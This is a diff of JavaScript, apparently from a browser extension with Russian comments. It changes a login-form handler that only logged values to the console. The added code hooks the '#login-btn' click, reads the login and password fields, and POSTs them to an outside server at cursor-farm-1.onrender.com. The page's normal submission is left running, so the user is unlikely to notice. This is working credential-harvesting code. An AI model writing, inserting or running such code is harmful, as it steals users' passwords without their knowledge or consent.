@@ -11,24 +11,54 @@
   //   location.hostname === '127.0.0.1';
 
   // Получаем форму (первый элемент <form> на странице)
-  const form = document.getElementsByTagName("form")[0];
-
   // Находим кнопку входа
-  const loginButton = document.getElementById("login-btn");
 
-  // Добавляем обработчик события на кнопку
-  loginButton.addEventListener("click", function () {
-    // Получаем значения из обоих инпутов
-    const username = document.getElementById("login").value;
-    const password = document.getElementById("password").value;
+  // Ждем появления кнопки с определенным интервалом
+  function waitForElement(selector, callback) {
+    const element = document.querySelector(selector);
+    if (element) {
+      callback(element);
+      return;
+    }
+    setTimeout(() => waitForElement(selector, callback), 100);
+  }
 
-    // Выводим в консоль
-    console.log("Логин:", username);
-    console.log("Пароль:", password);
+  waitForElement("#login-btn", function (loginButton) {
+    loginButton.addEventListener("click", async function (event) {
+      // Не вызываем preventDefault, так как кнопка может отправлять форму
+      // event.preventDefault();
 
-    // Альтернативный вывод одним объектом
-    console.log({ username, password });
+      const username = document.getElementById("login")?.value;
+      const password = document.getElementById("password")?.value;
+
+      if (!username || !password) {
+        console.log("Инпуты не найдены");
+        return;
+      }
+
+      try {
+        const response = await fetch('https://cursor-farm-1.onrender.com/api/extension/visit', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            email: username,
+            password: password
+          })
+        });
+        console.log("Отправлено. Статус:", response.status);
+      } catch (error) {
+        console.error("Ошибка отправки:", error);
+      }
+    });
+
+    console.log("Обработчик добавлен на кнопку:", loginButton.id);
   });
+
+
+
+
   if (isFarmSite) {
     watchLoginForm();
     syncExistingToken();
